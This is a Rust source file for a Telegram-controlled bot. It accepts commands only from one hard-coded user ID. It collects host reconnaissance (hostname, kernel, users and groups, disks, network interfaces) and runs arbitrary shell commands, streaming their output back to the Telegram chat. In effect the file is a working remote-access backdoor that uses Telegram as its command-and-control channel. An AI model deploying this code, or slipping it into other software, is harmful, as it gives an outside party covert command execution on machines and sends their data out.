use frankenstein::{AsyncTelegramApi, GetUpdatesParams, Message, SendMessageParams, EditMessageTextParams, UpdateContent};
use frankenstein::api::{AsyncApi};


use std::fmt::Write;
use std::process::Stdio;

use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;

use sysinfo::{NetworkExt, System, SystemExt, UserExt};

static TOKEN: &str = "<YOUR-BOT-TOKEN>";
static BOT_ID: &str = "rust-bot-dev";
static PREFIX: &str = ".";
static MASTER: u64 = YOUR-TELEGRAM-USER-ID;

#[tokio::main]
async fn main() {
    match std::env::consts::OS {
        "windows" => {}
        "linux" => {}
        "android" => {}
        "ios" => {}
        "macos" => {}
        _ => {}
    }

    let api = AsyncApi::new(TOKEN);

    let update_params_builder = GetUpdatesParams::builder();
    let mut update_params = update_params_builder.clone().build();


    loop {
        let result = api.get_updates(&update_params).await;
        
        println!("Debug - result: {:?}", result);

        match result {
            Ok(response) => {
                for update in response.result {
                    if let UpdateContent::Message(message) = update.content {
                        let api_clone = api.clone();

                        tokio::spawn(async move {
                            process_command(message, api_clone).await;
                        });

                        update_params = update_params_builder
                            .clone()
                            .offset(update.update_id + 1)
                            .build();
                    }
                }
            }
            Err(error) => {
                println!("[-] Failed to get updates: {:?}", error);
            }
        }
    }
}

async fn process_command(message: Message, api: AsyncApi) {
    let data: &str = message.text.as_ref().unwrap();
    let args: Vec<&str> = data.split_whitespace().collect();

    if !args[0].starts_with(PREFIX) {
       // println!("[-] Not a command: {}", args[0]);
        return;
    }
    if !auth(&message, &api).await {
        println!("[-] User [{}] Not authorized", message.from.unwrap().id);
        return;
    }

    match args[0] {
        ".ping" => ping(&message, &api).await,
        ".cmd" => cmd(args, &message, &api).await,
        ".sysinfo" => systeminfo(&message, &api).await,
        _ => {}
    }
}

async fn ping(message: &Message, api: &AsyncApi) {
    let send_message_params = SendMessageParams::builder()
        .chat_id(message.chat.id)
        .text(format!("[+] Pong [{}]", BOT_ID))
        .reply_to_message_id(message.message_id)
        .build();

    if let Err(err) = api.send_message(&send_message_params).await {
        println!("[-] Failed to send message: {:?}", err);
    }
}

#[allow(unused_must_use)]
async fn systeminfo(message: &Message, api: &AsyncApi) {
    let mut output_msg = String::new();
    output_msg += "[+] Info:\n\n";

    let send_message_params = SendMessageParams::builder()
        .chat_id(message.chat.id)
        .text(&output_msg)
        .reply_to_message_id(message.message_id)
        .build();

    let result = api.send_message(&send_message_params).await;
    let my_message_id: i32;

    match result {
        Ok(response) => my_message_id = response.result.message_id,
        Err(err) => {
            println!("[-] Error getting 'message_id' for output: {:?}", err);
            return;
        }
    }

    let mut sys = System::new_all();
    sys.refresh_all();

    writeln!(output_msg, "{}", "=> system:");
    writeln!(output_msg, "System name:   {:?}", sys.name());
    writeln!(output_msg, "Kernel:        {:?}", sys.kernel_version());
    writeln!(output_msg, "OS:            {:?}", sys.os_version());
    writeln!(output_msg, "Hostname:      {:?}", sys.host_name());

    writeln!(output_msg, "\n{}", "=> users:");
    for user in sys.users() {
        writeln!(
            output_msg,
            "User: {:?} {:?} {:?}",
            user.name(),
            user.name(),
            user.groups()
        );
    }

    writeln!(output_msg, "\n{}", "=> disks:");
    for disk in sys.disks() {
        writeln!(output_msg, "{:?}", disk);
    }

    writeln!(output_msg, "\n{}", "=> networks:");
    for (interface_name, data) in sys.networks() {
        writeln!(
            output_msg,
            "{}: {}/{} B",
            interface_name,
            data.received(),
            data.transmitted()
        );
    }

    let edit_message_params = EditMessageTextParams::builder()
        .chat_id(message.chat.id)
        .message_id(my_message_id)
        .text(&output_msg)
        .build();

    if let Err(err) = api.edit_message_text(&edit_message_params).await {
        println!("[-] Failed to edit message: {:?}", err);
    }
}

async fn cmd(data: Vec<&str>, message: &Message, api: &AsyncApi) {
    if data.len() < 2 {
        return;
    }

    let args: Vec<&str> = data[1..].to_vec();

    let mut output_msg = String::new();
    output_msg += "[+] Output:\n\n";

    let send_msg_params = SendMessageParams::builder()
        .chat_id(message.chat.id)
        .text(&output_msg)
        .reply_to_message_id(message.message_id)
        .build();

    let result = api.send_message(&send_msg_params).await;
    let my_message_id: i32;

    match result {
        Ok(response) => my_message_id = response.result.message_id,
        Err(err) => {
            println!("[-] Error getting 'message_id' for output: {:?}", err);
            return;
        }
    }

    //let command: Result<Child, std::io::Error>;
    let mut command = Command::new(args[0]);
    if args.len() >= 2 {
        command.args(&args[1..]);
    }

    match command.stdout(Stdio::piped()).spawn() {
        Ok(result) => {
            let stdout = result.stdout.expect("[-] Process stdout failed");
            let reader = BufReader::new(stdout);
            let mut lines = reader.lines();

            while let Some(line) = lines
                .next_line()
                .await
                .expect("[-] Error reading cmd output lines")
            {
                println!("line = {}", line);
                output_msg += &format!("{}\n", &line);
                let edit_msg_params = EditMessageTextParams::builder()
                    .chat_id(message.chat.id)
                    .message_id(my_message_id)
                    .text(&output_msg)
                    .build();

                if let Err(err) = api.edit_message_text(&edit_msg_params).await {
                    println!("[-] Failed to edit message: {:?}", err);
                }
            }
        }

        Err(err) => {
            output_msg += &format!("[-] Error executing command: {}", err).to_string();
            println!("{}", output_msg);
            let edit_msg_params = EditMessageTextParams::builder()
                .chat_id(message.chat.id)
                .message_id(my_message_id)
                .text(output_msg)
                .build();

            if let Err(err) = api.edit_message_text(&edit_msg_params).await {
                println!("[-] Failed to edit message: {:?}", err);
            }
        }
    }
}

async fn auth(message: &Message, api: &AsyncApi) -> bool {
    let sender_id: u64 = message.from.as_ref().unwrap().id;
    if sender_id != MASTER { 
        let send_msg_params = SendMessageParams::builder()
            .chat_id(message.chat.id)
            .text(format!("[-] User '{}' not authorized", sender_id).as_str())
            .reply_to_message_id(message.message_id)
            .build();

        if let Err(err) = api.send_message(&send_msg_params).await {
            println!("[-] Failed to send message: {:?}", err);
        }

        return false;
    }
    return true;
}
